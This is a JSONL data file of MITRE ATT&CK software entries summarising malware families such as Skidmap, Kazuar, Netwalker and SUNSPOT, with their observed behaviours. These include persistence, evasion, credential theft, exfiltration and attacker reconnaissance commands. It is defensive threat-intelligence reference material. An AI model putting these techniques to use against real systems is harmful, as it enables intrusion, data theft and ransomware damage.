{"text": " [Nerex](https://attack.mitre.org/software/S0210) is a Trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Nerex May 2012)", "idx": "https://attack.mitre.org/software/S0210", "title": "Nerex", "entity": "Nerex", "entity_type": "software", "entity_context": ["Nerex drops a signed Microsoft DLL to disk.", "Nerex creates a Registry subkey that registers a new service.", "Nerex creates a backdoor through which remote attackers can download files onto a compromised host."], "is_subtechnique": false}
{"text": " [Skidmap](https://attack.mitre.org/software/S0468) is a kernel-mode rootkit used for cryptocurrency mining.(Citation: Trend Micro Skidmap)", "idx": "https://attack.mitre.org/software/S0468", "title": "Skidmap", "entity": "Skidmap", "entity_type": "software", "entity_context": ["Skidmap has checked for the existence of specific files including <code>/usr/sbin/setenforce</code> and <code> /etc/selinux/config</code>. It also has the ability to monitor the cryptocurrency miner file and process.  ", "Skidmap has the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users.", "Skidmap has installed itself via crontab.", "Skidmap has used <code>pm.sh</code> to download and install its main payload.", "Skidmap is a kernel-mode rootkit used for cryptocurrency mining.", "Skidmap is a kernel-mode rootkit that has the ability to hook system calls to hide specific files and fake network and CPU-related statistics to make the CPU load of the infected machine always appear low.", "Skidmap has the ability to set SELinux to permissive mode.", "Skidmap has encrypted it's main payload using 3DES. ", "Skidmap has the ability to check if <code>/usr/sbin/setenforce</code> exists. This file controls what mode SELinux is in. ", "Skidmap has the ability to add the public key of its handlers to the <code>authorized_keys</code> file to maintain persistence on an infected host.", "Skidmap has created a fake <code>rm</code> binary to replace the legitimate Linux binary.", "Skidmap has the ability to download files on an infected host. ", "Skidmap has the ability to download, unpack, and decrypt tar.gz files . ", "Skidmap has monitored critical processes to ensure resiliency. ", "Skidmap has the ability to install several loadable kernel modules (LKMs) on infected machines.", "Skidmap has the ability to check whether the infected system’s OS is Debian or RHEL/CentOS to determine which cryptocurrency miner it should use."], "is_subtechnique": false}
{"text": " [cmd](https://attack.mitre.org/software/S0106) is the Windows command-line interpreter that can be used to interact with systems and execute other processes and utilities. (Citation: TechNet Cmd) Cmd.exe contains native functionality to perform many operations to interact with the system, including listing files in a directory (e.g., <code>dir</code> (Citation: TechNet Dir)), deleting files (e.g., <code>del</code> (Citation: TechNet Del)), and copying files (e.g., <code>copy</code> (Citation: TechNet Copy)).", "idx": "https://attack.mitre.org/software/S0106", "title": "cmd", "entity": "cmd", "entity_type": "software", "entity_context": ["cmd can be used to delete files from the file system.", "cmd can be used to copy files to/from a remotely connected internal system.", "cmd can be used to find information about the operating system.", "cmd can be used to find files and directories with native functionality such as <code>dir</code> commands.", "cmd is used to execute programs and other actions at the command-line interface.", "cmd can be used to copy files to/from a remotely connected external system."], "is_subtechnique": false}
{"text": " [TYPEFRAME](https://attack.mitre.org/software/S0263) is a remote access tool that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT TYPEFRAME June 2018)", "idx": "https://attack.mitre.org/software/S0263", "title": "TYPEFRAME", "entity": "TYPEFRAME", "entity_type": "software", "entity_context": ["APIs and strings in some TYPEFRAME variants are RC4 encrypted. Another variant is encoded with XOR.", "TYPEFRAME can open the Windows Firewall on the victim’s machine to allow incoming connections.", "TYPEFRAME can search directories for files on the victim’s machine.", "TYPEFRAME can delete files off the system.", "A TYPEFRAME variant can force the compromised system to function as a proxy server.", "One TYPEFRAME variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value \"0x35\".", "TYPEFRAME can uninstall malware components using a batch script. TYPEFRAME can execute commands using a shell.", "TYPEFRAME has used ports 443, 8080, and 8443 with a FakeTLS method.", "TYPEFRAME variants can use ports 443, 8443, and 8080 for communications.", "A Word document delivering TYPEFRAME prompts the user to enable macro execution.", "TYPEFRAME variants can add malicious DLL modules as new services.TYPEFRAME can also delete services from the victim’s machine.", "TYPEFRAME can gather the disk volume information.", "TYPEFRAME has used a malicious Word document for delivery with VBA macros for execution.", "TYPEFRAME can upload and download files to the victim’s machine.", "TYPEFRAME can install encrypted configuration data under the Registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll</code> and <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs</code>."], "is_subtechnique": false}
{"text": " [RATANKBA](https://attack.mitre.org/software/S0241) is a remote controller tool used by [Lazarus Group](https://attack.mitre.org/groups/G0032). [RATANKBA](https://attack.mitre.org/software/S0241) has been used in attacks targeting financial institutions in Poland, Mexico, Uruguay, the United Kingdom, and Chile. It was also seen used against organizations related to telecommunications, management consulting, information technology, insurance, aviation, and education. [RATANKBA](https://attack.mitre.org/software/S0241) has a graphical user interface to allow the attacker to issue jobs to perform on the infected machines. (Citation: Lazarus RATANKBA) (Citation: RATANKBA)", "idx": "https://attack.mitre.org/software/S0241", "title": "RATANKBA", "entity": "RATANKBA", "entity_type": "software", "entity_context": ["RATANKBA uses cmd.exe to execute commands.", "RATANKBA gathers the victim’s IP address via the <code>ipconfig -all</code> command.", "RATANKBA uploads and downloads information.", "RATANKBA uses WMI to perform process monitoring.", "RATANKBA runs the <code>net view /domain</code> and <code>net view</code> commands.", "RATANKBA uses HTTP/HTTPS for command and control communication.", "RATANKBA lists the system’s processes.", "RATANKBA uses the command <code>reg query “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings”</code>.", "RATANKBA gathers information about the OS architecture, OS name, and OS version/Service pack.", "RATANKBA uses port 443 for C2.", "RATANKBA performs a reflective DLL injection using a given pid.", "RATANKBA runs the <code>whoami</code> and <code>query user</code> commands.", "RATANKBA uses <code>netstat -ano</code> to search for specific IP address ranges.", "RATANKBA uses <code>tasklist /svc</code> to display running tasks.", "RATANKBA uses the <code>net user</code> command.", "There is a variant of RATANKBA that uses a PowerShell script instead of the traditional PE form."], "is_subtechnique": false}
{"text": " [FLASHFLOOD](https://attack.mitre.org/software/S0036) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)", "idx": "https://attack.mitre.org/software/S0036", "title": "FLASHFLOOD", "entity": "FLASHFLOOD", "entity_type": "software", "entity_context": ["FLASHFLOOD achieves persistence by making an entry in the Registry's Run key.", "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system. FLASHFLOOD will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories. FLASHFLOOD also collects information stored in the Windows Address Book.", "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.", "FLASHFLOOD employs the same encoding scheme as SPACESHIP for data it stages. Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23.", "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by SPACESHIP.", "FLASHFLOOD stages data it copies from the local system or removable drives in the \"%WINDIR%\\$NtUninstallKB885884$\\\" directory."], "is_subtechnique": false}
{"text": " [Exaramel for Windows](https://attack.mitre.org/software/S0343) is a backdoor used for targeting Windows systems. The Linux version is tracked separately under [Exaramel for Linux](https://attack.mitre.org/software/S0401).(Citation: ESET TeleBots Oct 2018)", "idx": "https://attack.mitre.org/software/S0343", "title": "Exaramel for Windows", "entity": "Exaramel for Windows", "entity_type": "software", "entity_context": ["Exaramel for Windows has a command to execute VBS scripts on the victim’s machine.", "The Exaramel for Windows dropper creates and starts a Windows service named wsmprovav with the description “Windows Check AV” in an apparent attempt to masquerade as a legitimate service.", "Exaramel for Windows specifies a path to store files scheduled for exfiltration. ", "Exaramel for Windows has a command to launch a remote shell and executes commands on the victim’s machine.", "The Exaramel for Windows dropper creates and starts a Windows service named wsmprovav with the description “Windows Check AV.”", "Exaramel for Windows automatically encrypts files before sending them to the C2 server. ", "Exaramel for Windows adds the configuration to the Registry in XML format."], "is_subtechnique": false}
{"text": " [Turian](https://attack.mitre.org/software/S0647) is a backdoor that has been used by [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) to target Ministries of Foreign Affairs, telecommunication companies, and charities in Africa, Europe, the Middle East, and Asia. First reported in 2021, [Turian](https://attack.mitre.org/software/S0647) is likely related to Quarian, an older backdoor that was last observed being used in 2013 against diplomatic targets in Syria and the United States.(Citation: ESET BackdoorDiplomacy Jun 2021)", "idx": "https://attack.mitre.org/software/S0647", "title": "Turian", "entity": "Turian", "entity_type": "software", "entity_context": ["Turian can search for specific files and list directories.", "Turian can use WinRAR to create a password-protected archive for files of interest.", "Turian can retrieve system information including OS version, memory usage, local hostname, and system adapter information.", "Turian can use VMProtect for obfuscation.", "Turian can insert pseudo-random characters into its network encryption setup.", "Turian can scan for removable media to collect data.", "Turian can download additional files and tools from its C2.", "Turian has the ability to use HTTP for its C2.", "Turian has the ability to use <code>/bin/sh</code> to execute commands.", "Turian can retrieve the internal IP address of a compromised host.", "Turian has the ability to use Python to spawn a Unix shell.", "Turian can retrieve usernames.", "Turian has the ability to take screenshots.", "Turian can establish persistence by adding Registry Run keys.", "Turian can create a remote shell and execute commands using cmd.", "Turian has the ability to use a XOR decryption key to extract C2 server domains and IP addresses.", "Turian can disguise as a legitimate service to blend into normal operations.", "Turian can store copied files in a specific directory prior to exfiltration."], "is_subtechnique": false}
{"text": " [Kazuar](https://attack.mitre.org/software/S0265) is a fully featured, multi-platform backdoor Trojan written using the Microsoft .NET framework. (Citation: Unit 42 Kazuar May 2017)", "idx": "https://attack.mitre.org/software/S0265", "title": "Kazuar", "entity": "Kazuar", "entity_type": "software", "entity_context": ["Kazuar captures screenshots of the victim’s screen.", "Kazuar gathers information on local groups and members on the victim’s machine.", "Kazuar obtains a list of running processes through WMI querying and the <code>ps</code> command.", "Kazuar uses FTP and FTPS to communicate with the C2 server.", "Kazuar finds a specified directory, lists the files and metadata about those files.", "Kazuar uses /bin/bash to execute commands on the victim’s machine.", "Kazuar gathers information about network adapters.", "Kazuar captures images from the webcam.", "Kazuar can install itself as a new service.", "Kazuar uses HTTP and HTTPS to communicate with the C2 server. Kazuar can also act as a webserver and listen for inbound HTTP requests through an exposed API.", "Kazuar can overwrite files with random data before deleting them.", "Kazuar encodes communications to the C2 server in Base64.", "Kazuar can accept multiple URLs for C2 servers.", "If running in a Windows environment, Kazuar saves a DLL to disk that is injected into the explorer.exe process to execute the payload. Kazuar can also be configured to inject and execute within specific processes.", "Kazuar has used internal nodes on the compromised network for C2 communications.", "Kazuar can sleep for a specific time and be set to communicate at specific intervals.", "Kazuar has used compromised WordPress blogs as C2 servers.", "Kazuar can delete files.", "Kazuar uploads files from a specified directory to the C2 server.", "Kazuar gathers information on users.", "Kazuar stages command output and collected data in files before exfiltration.", "Kazuar gathers information about opened windows.", "Kazuar adds a sub-key under several Registry run keys.", "Kazuar obtains a list of running processes through WMI querying.", "Kazuar downloads additional plug-ins to load on the victim’s machine, including the ability to upgrade and replace its own binary.", "Kazuar adds a .lnk file to the Windows startup folder.", "Kazuar gathers information about local groups and members.", "Kazuar uses cmd.exe to execute commands on the victim’s machine.", "Kazuar gathers information on the system and local drives.", "Kazuar is obfuscated using the open source ConfuserEx protector. Kazuar also obfuscates the name of created files/folders/mutexes and encrypts debug messages written to log files using the Rijndael cipher."], "is_subtechnique": false}
{"text": " [MirageFox](https://attack.mitre.org/software/S0280) is a remote access tool used against Windows systems. It appears to be an upgraded version of a tool known as Mirage, which is a RAT believed to originate in 2012. (Citation: APT15 Intezer June 2018)", "idx": "https://attack.mitre.org/software/S0280", "title": "MirageFox", "entity": "MirageFox", "entity_type": "software", "entity_context": ["MirageFox has a function for decrypting data containing C2 configuration information.", "MirageFox uses port 80 for C2.", "MirageFox can gather the username from the victim’s machine.", "MirageFox can collect CPU and architecture information from the victim’s machine.", "MirageFox is likely loaded via DLL hijacking into a legitimate McAfee binary.", "MirageFox has the capability to execute commands using cmd.exe."], "is_subtechnique": false}
{"text": " [EvilBunny](https://attack.mitre.org/software/S0396) is a C++ malware sample observed since 2011 that was designed to be a execution platform for Lua scripts.(Citation: Cyphort EvilBunny Dec 2014)", "idx": "https://attack.mitre.org/software/S0396", "title": "EvilBunny", "entity": "EvilBunny", "entity_type": "software", "entity_context": ["EvilBunny has used various API calls as part of its checks to see if the malware is running in a sandbox.\t", "EvilBunny has used WMI to gather information about the system.", "EvilBunny has exploited CVE-2011-4369, a vulnerability in the PRC component in Adobe Reader.", "EvilBunny has an integrated scripting engine to download and execute Lua scripts.", "EvilBunny has deleted the initial dropper after running through the environment checks.", "EvilBunny has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.", "EvilBunny's dropper has checked the number of processes and the length and strings of its own file name to identify if the malware is in a sandbox environment.\t", "EvilBunny has executed commands via scheduled tasks.", "EvilBunny has executed C2 commands directly via HTTP.", "EvilBunny has created Registry keys for persistence in <code>HKLM|HKCU\\…\\CurrentVersion\\Run</code>.\t", "EvilBunny has downloaded additional Lua scripts from the C2.", "EvilBunny has used EnumProcesses() to identify how many process are running in the environment.", "EvilBunny has been observed querying installed antivirus software.", "EvilBunny has used the API calls NtQuerySystemTime, GetSystemTimeAsFileTime, and GetTickCount to gather time metrics as part of its checks to see if the malware is running in a sandbox."], "is_subtechnique": false}
{"text": " FruitFly is designed to spy on mac users (Citation: objsee mac malware 2017).", "idx": "https://attack.mitre.org/software/S0277", "title": "FruitFly", "entity": "FruitFly", "entity_type": "software", "entity_context": ["FruitFly saves itself with a leading \".\" to make it a hidden file.", "FruitFly persists via a Launch Agent.", "FruitFly takes screenshots of the user's desktop.", "FruitFly will delete files on the system.", "FruitFly executes and stores obfuscated Perl scripts.", "FruitFly looks for specific files and file types.", "FruitFly has the ability to list processes on the system."], "is_subtechnique": false}
{"text": " [Kessel](https://attack.mitre.org/software/S0487) is an advanced version of OpenSSH which acts as a custom backdoor, mainly acting to steal credentials and function as a bot. [Kessel](https://attack.mitre.org/software/S0487) has been active since its C2 domain began resolving in August 2018.(Citation: ESET ForSSHe December 2018)", "idx": "https://attack.mitre.org/software/S0487", "title": "Kessel", "entity": "Kessel", "entity_type": "software", "entity_context": ["Kessel has collected the system architecture, OS version, and MAC address information.", "Kessel has exfiltrated data via hexadecimal-encoded subdomain fields of DNS queries.", "Kessel can use a proxy during exfiltration if set in the configuration.", "Kessel can exfiltrate credentials and other information via HTTP POST request, TCP, and DNS.", "Kessel has decrypted the binary's configuration once the <code>main</code> function was launched.", "Kessel has collected the DNS address of the infected host.", "Kessel has trojanized the <sode>ssh_login</code> and <code>user-auth_pubkey</code> functions to steal plaintext credentials.", "Kessel can split the data to be exilftrated into chunks that will fit in subdomains of DNS queries.", "Kessel can RC4-encrypt credentials before sending to the C2.\t", "Kessel can create a reverse shell between the infected host and a specified system.\t", "Kessel has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.", "Kessel has exfiltrated information gathered from the infected system to the C2 server.", "Kessel's configuration is hardcoded and RC4 encrypted within the binary.", "Kessel can download additional modules from the C2 server."], "is_subtechnique": false}
{"text": " [Dyre](https://attack.mitre.org/software/S0024) is a banking Trojan that has been used for financial gain. (Citation: Symantec Dyre June 2015)(Citation: Malwarebytes Dyreza November 2015)", "idx": "https://attack.mitre.org/software/S0024", "title": "Dyre", "entity": "Dyre", "entity_type": "software", "entity_context": ["Dyre has the ability to identify the computer name, OS version, and hardware configuration on a compromised host.", "Dyre has the ability to identify the users on a compromised host.", "Dyre uses HTTPS for C2 communications.\t ", "Dyre has the ability to directly inject its code into the web browser process.", "Dyre has the ability to achieve persistence by adding a new task in the task scheduler to run every minute.", "Dyre injects into other processes to load modules.", "Dyre has the ability to identify network settings on a compromised host.", "Dyre has the ability to create files in a TEMP folder to act as a database to store information.", "Dyre can detect sandbox analysis environments by inspecting the process list and Registry.", "Dyre has the ability to identify installed programs on a compromised host.", "Dyre has a command to download and executes additional files.", "Dyre has been delivered with encrypted resources and must be unpacked for execution.", "Dyre decrypts resources needed for targeting the victim.", "Dyre registers itself as a service by adding several Registry keys.", "Dyre has the ability to send information staged on a compromised host externally to C2.", "Dyre has the ability to identify running services on a compromised host."], "is_subtechnique": false}
{"text": " [MarkiRAT](https://attack.mitre.org/software/S0652) is a remote access Trojan (RAT) compiled with Visual Studio that has been used by [Ferocious Kitten](https://attack.mitre.org/groups/G0137) since at least 2015.(Citation: Kaspersky Ferocious Kitten Jun 2021)", "idx": "https://attack.mitre.org/software/S0652", "title": "MarkiRAT", "entity": "MarkiRAT", "entity_type": "software", "entity_context": ["MarkiRAT can check for the Telegram installation directory by enumerating the files on disk.", "MarkiRAT can masquerade as <code>update.exe</code> and <code>svehost.exe</code>; it has also mimicked legitimate Telegram and Chrome files.", "MarkiRAT can store collected data locally in a created .nfo file.", "MarkiRAT can modify the shortcut that launches Telegram by replacing its path with the malicious payload to launch with the legitimate executable.", "MarkiRAT can capture screenshots that are initially saved as ‘scr.jpg’.", "MarkiRAT can search for different processes on a system.", "MarkiRAT can obtain the computer name from a compromised host.", "MarkiRAT can look for files carrying specific extensions such as: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, and .jpb.", "MarkiRAT can gather information from the Keepass password manager. ", "MarkiRAT can use the <code>GetKeyboardLayout</code> API to check if a compromised host's keyboard is set to Persian.", "MarkiRAT can download additional files and tools from its C2 server, including through the use of BITSAdmin.", "MarkiRAT can retrieve the victim’s username.", "MarkiRAT can capture all keystrokes on a compromised host.", "MarkiRAT can use BITS Utility to connect with the C2 server.", "MarkiRAT can exfiltrate locally stored data via its C2.", "MarkiRAT can upload data from the victim's machine to the C2 server.", "MarkiRAT can check for running processes on the victim’s machine to look for Kaspersky and Bitdefender antivirus products.", "MarkiRAT can initiate communication over HTTP/HTTPS for its C2 server.", "MarkiRAT can drop its payload into the Startup directory to ensure it automatically runs when the compromised system is started.", "MarkiRAT can run the ShellExecuteW API via the Windows Command Shell.", "MarkiRAT can capture clipboard content.", "MarkiRAT can utilize cmd.exe to execute commands in a victim's environment."], "is_subtechnique": false}
{"text": " [Netwalker](https://attack.mitre.org/software/S0457) is fileless ransomware written in PowerShell and executed directly in memory.(Citation: TrendMicro Netwalker May 2020)", "idx": "https://attack.mitre.org/software/S0457", "title": "Netwalker", "entity": "Netwalker", "entity_type": "software", "entity_context": ["Netwalker can detect and terminate active security software-related processes on infected systems.\t", "The Netwalker DLL has been injected reflectively into the memory of a legitimate running process.\t", "Netwalker can use Windows API functions to inject the ransomware DLL.", "Netwalker can determine the system architecture it is running on to choose which version of the DLL to use.", "Netwalker can add the following registry entry: <code>HKEY_CURRENT_USER\\SOFTWARE\\{8 random characters}</code>.", "Netwalker's PowerShell script can decode and decrypt multiple layers of obfuscation, leading to the Netwalker DLL being loaded into memory.", "Netwalker can encrypt files on infected machines to extort victims.\t", "Netwalker can use WMI to delete Shadow Volumes.\t", "Netwalker can detect and terminate active security software-related processes on infected systems.", "Netwalker's PowerShell script has been obfuscated with multiple layers including base64 and hexadecimal encoding and XOR-encryption, as well as obfuscated PowerShell functions and variables. Netwalker's DLL has also been embedded within the PowerShell script in hex format.", "Operators deploying Netwalker have used batch scripts to retrieve the Netwalker payload.", "Netwalker can terminate system processes and services, some of which relate to backup software.", "Operators deploying Netwalker have used psexec to copy the Netwalker payload across accessible systems.", "Netwalker can delete the infected system's Shadow Volumes to prevent recovery.", "Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload.", "Netwalker has been written in PowerShell and executed directly in memory, avoiding detection."], "is_subtechnique": false}
{"text": " [SPACESHIP](https://attack.mitre.org/software/S0035) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)", "idx": "https://attack.mitre.org/software/S0035", "title": "SPACESHIP", "entity": "SPACESHIP", "entity_type": "software", "entity_context": ["SPACESHIP identifies files with certain extensions and copies them to a directory in the user's profile.", "SPACESHIP copies staged data to removable drives when they are inserted into the system.", "Data SPACESHIP copies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23.", "SPACESHIP achieves persistence by creating a shortcut in the current user's Startup folder.", "SPACESHIP identifies files and directories for collection by searching for specific file extensions or file modification time."], "is_subtechnique": false}
{"text": " [3PARA RAT](https://attack.mitre.org/software/S0066) is a remote access tool (RAT) programmed in C++ that has been used by [Putter Panda](https://attack.mitre.org/groups/G0024). (Citation: CrowdStrike Putter Panda)", "idx": "https://attack.mitre.org/software/S0066", "title": "3PARA RAT", "entity": "3PARA RAT", "entity_type": "software", "entity_context": ["3PARA RAT has a command to set certain attributes such as creation/modification timestamps on files.", "3PARA RAT command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS. 3PARA RAT will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS if the DES decoding fails", "3PARA RAT uses HTTP for command and control.", "3PARA RAT has a command to retrieve metadata for files on disk as well as a command to list the current working directory."], "is_subtechnique": false}
{"text": " [P2P ZeuS](https://attack.mitre.org/software/S0016) is a closed-source fork of the leaked version of the ZeuS botnet. It presents improvements over the leaked version, including a peer-to-peer architecture. (Citation: Dell P2P ZeuS)", "idx": "https://attack.mitre.org/software/S0016", "title": "P2P ZeuS", "entity": "P2P ZeuS", "entity_type": "software", "entity_context": ["P2P ZeuS added junk data to outgoing UDP packets to peer implants."], "is_subtechnique": false}
{"text": " [Daserf](https://attack.mitre.org/software/S0187) is a backdoor that has been used to spy on and steal from Japanese, South Korean, Russian, Singaporean, and Chinese victims. Researchers have identified versions written in both Visual C and Delphi. (Citation: Trend Micro Daserf Nov 2017) (Citation: Secureworks BRONZE BUTLER Oct 2017)", "idx": "https://attack.mitre.org/software/S0187", "title": "Daserf", "entity": "Daserf", "entity_type": "software", "entity_context": ["Daserf leverages Mimikatz and Windows Credential Editor to steal credentials.", "Daserf hides collected data in password-protected .rar archives.", "Daserf can take screenshots.", "Some Daserf samples were signed with a stolen digital certificate.", "Daserf can download remote files.", "Daserf uses custom base64 encoding to obfuscate HTTP traffic.", "Daserf uses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs.", "Daserf uses RC4 encryption to obfuscate HTTP traffic.", "A version of Daserf uses the MPRESS packer.", "Daserf uses HTTP for C2.", "Analysis of Daserf has shown that it regularly undergoes technical improvements to evade anti-virus detection.", "Daserf can execute shell commands.", "Daserf uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.", "Daserf can log keystrokes.", "Daserf can use steganography to hide malicious code downloaded to the victim."], "is_subtechnique": false}
{"text": " [SUNSPOT](https://attack.mitre.org/software/S0562) is an implant that injected the [SUNBURST](https://attack.mitre.org/software/S0559) backdoor into the SolarWinds Orion software update framework. It was used by [APT29](https://attack.mitre.org/groups/G0016) since at least February 2020.(Citation: CrowdStrike SUNSPOT Implant January 2021)", "idx": "https://attack.mitre.org/software/S0562", "title": "SUNSPOT", "entity": "SUNSPOT", "entity_type": "software", "entity_context": ["SUNSPOT modified its security token to grants itself debugging privileges by adding <code>SeDebugPrivilege</code>.", "SUNSPOT decrypts SUNBURST, which was stored in AES128-CBC encrypted blobs.  ", "SUNSPOT encrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs for SUNBURST source code and data extracted from the SolarWinds Orion <MsBuild.exe</code> process.", "SUNSPOT monitored running processes for instances of <code>MsBuild.exe</code> by hashing the name of each running process and comparing it to the corresponding value <code>0x53D525</code>. It also extracted command-line arguments and individual arguments from the running <code>MsBuild.exe</code> process to identify the directory path of the Orion software Visual Studio solution.", "SUNSPOT malware was designed and used to insert SUNBURST into software builds of the SolarWinds Orion IT management product.", "SUNSPOT enumerated the Orion software Visual Studio solution directory path.", "SUNSPOT created a copy of the SolarWinds Orion software source file with a <code>.bk</code> extension to backup the original content, wrote SUNBURST using the same filename but with a <code>.tmp</code> extension, and then moved SUNBURST using <code>MoveFileEx</code> to the original filename with a <code>.cs</code> extension so it could be compiled within Orion software.", "SUNSPOT used Windows API functions such as <code>MoveFileEx</code> and <code>NtQueryInformationProcess</code> as part of the SUNBURST injection process. ", "Following the successful injection of SUNBURST, SUNSPOT deleted a temporary file it created named <code>InventoryManager.bk</code> after restoring the original SolarWinds Orion source code to the software library.", "SUNSPOT only replaces SolarWinds Orion source code if the MD5 checksums of both the original source code file and backdoored replacement source code match hardcoded values. ", "SUNSPOT was identified on disk with a filename of <code>taskhostsvc.exe</code> and it created an encrypted log file at <code>C:\\Windows\\Temp\\vmware-vmdmp.log</code>. "], "is_subtechnique": false}
{"text": " [DownPaper](https://attack.mitre.org/software/S0186) is a backdoor Trojan; its main functionality is to download and run second stage malware. (Citation: ClearSky Charming Kitten Dec 2017)", "idx": "https://attack.mitre.org/software/S0186", "title": "DownPaper", "entity": "DownPaper", "entity_type": "software", "entity_context": ["DownPaper uses PowerShell for execution.", "DownPaper uses PowerShell to add a Registry Run key in order to establish persistence.", "DownPaper communicates to its C2 server over HTTP.", "DownPaper collects the victim host name and serial number, and then sends the information to the C2 server.", "DownPaper collects the victim username and sends it to the C2 server.", "DownPaper uses the command line.", "DownPaper searches and reads the value of the Windows Update Registry Run key."], "is_subtechnique": false}
{"text": " [AutoIt backdoor](https://attack.mitre.org/software/S0129) is malware that has been used by the actors responsible for the MONSOON campaign. The actors frequently used it in weaponized .pps files exploiting CVE-2014-6352. (Citation: Forcepoint Monsoon) This malware makes use of the legitimate scripting language for Windows GUI automation with the same name.", "idx": "https://attack.mitre.org/software/S0129", "title": "AutoIt backdoor", "entity": "AutoIt backdoor", "entity_type": "software", "entity_context": ["AutoIt backdoor downloads a PowerShell script that decodes to a typical shellcode loader.", "AutoIt backdoor has sent a C2 response that was base64-encoded.", "AutoIt backdoor is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.", "AutoIt backdoor attempts to escalate privileges by bypassing User Access Control."], "is_subtechnique": false}
{"text": " [HiddenWasp](https://attack.mitre.org/software/S0394) is a Linux-based Trojan used to target systems for remote control. It comes in the form of a statically linked ELF binary with stdlibc++.(Citation: Intezer HiddenWasp Map 2019)", "idx": "https://attack.mitre.org/software/S0394", "title": "HiddenWasp", "entity": "HiddenWasp", "entity_type": "software", "entity_context": ["HiddenWasp uses a rootkit to hook and implement functions on the system.", "HiddenWasp installs reboot persistence by adding itself to <code>/etc/rc.local</code>.", "HiddenWasp uses a cipher to implement a decoding function.", "HiddenWasp encrypts its configuration and payload.", "HiddenWasp uses a script to automate tasks on the victim's machine and to assist in execution.", "HiddenWasp uses an RC4-like algorithm with an already computed PRGA generated key-stream for network communication.", "HiddenWasp creates a user account as a means to provide initial persistence to the compromised machine.", "HiddenWasp communicates with a simple network protocol over TCP.", "HiddenWasp downloads a tar compressed archive from a download server to the system.", "HiddenWasp adds itself as a shared object to the LD_PRELOAD environment variable."], "is_subtechnique": false}
{"text": " [Lurid](https://attack.mitre.org/software/S0010) is a malware family that has been used by several groups, including [PittyTiger](https://attack.mitre.org/groups/G0011), in targeted attacks as far back as 2006. (Citation: Villeneuve 2014) (Citation: Villeneuve 2011)", "idx": "https://attack.mitre.org/software/S0010", "title": "Lurid", "entity": "Lurid", "entity_type": "software", "entity_context": ["Lurid can compress data before sending it.", "Lurid performs XOR encryption."], "is_subtechnique": false}
{"text": " [Linfo](https://attack.mitre.org/software/S0211) is a rootkit trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Linfo May 2012)", "idx": "https://attack.mitre.org/software/S0211", "title": "Linfo", "entity": "Linfo", "entity_type": "software", "entity_context": ["Linfo creates a backdoor through which remote attackers can list contents of drives and search for files.", "Linfo creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.", "Linfo creates a backdoor through which remote attackers can retrieve a list of running processes.", "Linfo creates a backdoor through which remote attackers can download files onto compromised hosts.", "Linfo creates a backdoor through which remote attackers can delete files.", "Linfo creates a backdoor through which remote attackers can retrieve system information.", "Linfo creates a backdoor through which remote attackers can obtain data from local systems.", "Linfo creates a backdoor through which remote attackers can start a remote shell.", "Linfo creates a backdoor through which remote attackers can change C2 servers."], "is_subtechnique": false}
{"text": " [POWERTON](https://attack.mitre.org/software/S0371) is a custom PowerShell backdoor first observed in 2018. It has typically been deployed as a late-stage backdoor by [APT33](https://attack.mitre.org/groups/G0064). At least two variants of the backdoor have been identified, with the later version containing improved functionality.(Citation: FireEye APT33 Guardrail)", "idx": "https://attack.mitre.org/software/S0371", "title": "POWERTON", "entity": "POWERTON", "entity_type": "software", "entity_context": ["POWERTON has used AES for encrypting C2 traffic.", "POWERTON can install a Registry Run key for persistence.", "POWERTON has used HTTP/HTTPS for C2 traffic.", "POWERTON has the ability to dump password hashes.", "POWERTON is written in PowerShell.", "POWERTON can use WMI for persistence.", "POWERTON has used port 443 for C2 traffic. "], "is_subtechnique": false}
